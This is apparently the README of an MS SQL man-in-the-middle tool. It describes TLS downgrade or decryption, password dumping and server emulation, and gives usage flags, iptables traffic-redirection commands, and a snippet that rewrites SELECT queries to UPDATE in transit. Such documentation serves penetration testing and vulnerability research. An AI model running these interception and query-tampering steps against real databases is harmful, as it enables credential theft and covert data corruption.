# MITM SQL proxy (TLS supported)

Tool for MS SQL Man In The Middle attack which supports TLS encryption. 

## How it works:
It listens for connection pretending to be a real MS SQL Server, decrypts traffic to obtain credentials or manipulate the queries and connect back to real SQL server and forward traffic.
When possible it downgrades connection to non-encrypted on both sides, if not it decrypts and encrypts data on-the-fly (on one or both sides depending on need) giving access to unencrypted data if only certificate is not verified on client side (which is default on most applications) or user can provide appropriate acceptable certificate. It can also emulate MS SQL Server to obtain credentials form connecting clients without use of a real server for forwarding.

## Dumping passwords
It shows passwords of connected users as well as those created or altered (changed) during the connection.

![screen](https://github.com/defragmentator/mitmsqlproxy/blob/master/screen.png?raw=true)

## Dumping interesting queries
Easy dumping interesting parts of the TDS packet (query\*) containing certain string or matching regular a expression:
```
    -f string_to_find  case insensitive, shows data from searched string occurence to potential
                        end of the entire string inside TDS packet (x00x00x00x00)
    -r regexp_to_find  e.g. -r '(?i)SELECT.*MyTable[\x00-\x7F]*'
```
*Note: it does NOT parse TDS packet or search only in query string part of the packet. If it is fragmented shows only the chunk containing string/regexp.


## Easy sniffing
To allow easy sniffing decrypted traffic by default is passing by loop on 127.0.0.1:1434
```
tcpdump -i lo port 1434 -X
```
## Easy queries manipulation
Traffic can be also easy redirected to some other middle application to manipulate queries. It needs to listen on some port, manipulate the data and send it back to some other port. All processed data is already decrypted.

As example *manipulation_example.py* show how to change all SELECT queries to UPDATE on-the-fly:

```python
...
    def dataReceived(self, data):
        i = data.find("SELECT".encode('utf-16le'))
        if i > -1:
            print("FOUND: SELECT - replacing to UPDATE")
            rstr = "UPDATE".encode('utf-16le')
            data = data[:i] + rstr + data[i + len(rstr):]
...
```

```
./mitmsqlproxy.py 192.168.123.2 -q -lcp 1444 &

./manipulation_example.py
```
*Note: in this example substitution of strings of the same length is performed. If string length changes it is needed to recalculate TDS frame values. Here impacket.tds package can be helpful.*

## Server emualtion
Using **null** as target MS SQL Server emulation is enabled, use of a real server for forwarding is not needed any more. Full handshake is performed, credentials are dropped and after that most of the clients will drop the connection due to errors (for each query *mitmsqlproxy* sends back a fake packet containing one row and one column).

## No certificate needed
Self-signed certificate is generated on-the-fly. For default configuration of SQL libraries, it will work (only login packet is encrypted).
If on client side full encryption is forced ("Encrypt connection" is selected or "Encrypt=true;" is present in the connection string) **it will work only when "Trust server certificate" is selected or 'TrustServerCertificate=true' is in connection string**. Trusted cerificate can be also provided in command line.

If needed custom user cert can be loaded from a file.

## Transparent traffic redirection 
If traffic goes through the machine interface it can be redirected to listening port with iptables like this:
```
sysctl net.ipv4.ip_forward=1 
iptables -t nat -A PREROUTING -p tcp --dport 1433 -j DNAT --to-destination 127.0.0.1:1433
```

## Command line options
```
usage: mitmsqlproxy.py [-h] [-port PORT] [-lport LPORT] [-f string_to_find] [-q | -d | -dd]
                        [-ll ip_address] [-llp port] [-lc ip_address]
                        [-lcp port] [--disable-loop] [--cert my.crt] [--key my.key] target

MSSQL MITM proxy (SSL supported).

positional arguments:
  target             MSSQL server name or address (use "null" for MSSQL server emulation - 
                      connection will be dropped after obtaining credentials)

options:
  -h, --help         show this help message and exit
  -port PORT         MSSQL server port (default 1433)
  -lport LPORT       local listening port (default 1433)
  -q                 quiet mode
  -d                 show more info
  -dd                show debug info

 Searches in raw packet for a string/regexp (does NOT: parse TDS packet or search only in query,
  if fragmented shows only the chunk containing string/regexp), can be used multiple times in
  command line:
  -f string_to_find  case insensitive
  -r regexp_to_find  e.g. -r '(?i)SELECT.*MyTable[\x00-\x7F]*'

Internal connection loop - decrypted data is sent to certain port (default 127.0.0.1:1434) and
coming back to mitmslqproxy to be encrypted and send further. This option allows to sniff or
even modify unencrypted SQL traffic in the fly with third party application:

  -ll ip_address     loop listening address (default 127.0.0.1)
  -llp port          loop listening address port (default 1434)
  -lc ip_address     loop connecting address (default 127.0.0.1)
  -lcp port          loop connecting address port (default 1434)
  --disable-loop     disable internal loop - if both sides will negotiate encryption sniffing
                        will be useless, only credentials will be shown on console (raw data
                        only in debug mode)

TLS custom private key and certificate (by default it is dynamically generated):
  --cert my.crt      certificate file
  --key my.key       private key file
```
# Inspirations and similar tools

* made as a tool to facilitate discovery: CVE-2023-4537, CVE-2023-4538, CVE-2023-4539
  
* metasploit auxiliary/server/capture/mssql - despite the visible option *SSL,SSLCert* it does not support encryption. It supports NTLM, but it is useful only when client is executed on the same machine as server. For newer clients it needs to be updated like this:
 ```
  def mssql_send_prelogin_response(c, info)
    data = [
      Constants::TDS_MSG_RESPONSE,
      1, # status
#      0x002b, # length
      0x0030, # length
      #"0000010000001a00060100200001020021000103002200000400220001ff0a3206510000020000"
      "0000010000001f000601002500010200260001030027000004002700010500280000ff0f0008350000020001"
    ].pack("CCnH*")
    c.put data
  end
```

* SSLsplit - has autossl option to detect ClientHello packet for STARTTLS et al, but it can find it only on the beginning of the packet. In TDS all handshake packets need to have TDS header so even with proper ClientHello detection it will not work (what is weird, after handshake TDS headers are dropped and included inside TLS tunnel).

* PolarProxy, stunnel - they are good for HTTP, but they cannot be configured for partial encryption with custom header.

* SQL Server Profiler - will redact LOGIN CREATE/ALTER passwords (it will work only on very old versions), won't show login credentials.

* SSLKEYLOGFILE environment variable will not work for other apps (MSSQL Clients) like for the web browsers. Even adding this option to Impacket's mssqlclient.py didn't work for me. When only TDS_LOGIN7 packet is encrypted probably because of lack of certificate use. 

* https://blog.thinkst.com/2015/11/stripping-encryption-from-microsoft-sql.html and their script https://gist.github.com/thinkst/db909e3a41c5cb07d43f - works as proxy, can downgrade to no encryption, but it needs to be tuned by hand with editing hexes. TLS is not supported.

* https://github.com/MindFlavor/TDSBridge - works as proxy. Authors say "(it even works with server side forced encryption)", but it didn't work for me and as far as I searched, I did not find the code responsible for encryption in the sources.

* sqlmitm.py from https://www.anitian.com/hacking-sql-servers-without-password/ - no encrytpion supported.

* Echo Mirage - very old and did not work - should inject to a process and get data before/after encryption.

# To do
* NTLM support
* full TDS packet parsing during search for strings and regular expressions in queries, defragmentation of queries
* overwriting ServerName field in TDS_LOGIN7 packet (server does not check this, but this way MITM attack can be now identified)
